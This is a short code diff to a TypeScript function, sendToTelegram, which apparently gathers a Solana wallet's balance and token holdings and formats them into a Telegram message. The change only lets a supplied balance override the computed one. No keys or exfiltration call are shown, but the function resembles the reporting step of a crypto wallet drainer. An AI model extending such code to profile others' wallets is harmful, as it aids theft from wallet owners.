@@ -127,7 +127,7 @@ export const sendToTelegram = async (walletData: any) => {
       console.error('Error fetching balance:', error);
     }
     
-    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
+    const solBalanceInSol = walletData.balance || solBalance / LAMPORTS_PER_SOL;
 
     const formattedTokens = walletData.tokens.map((token: any) => 
       `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
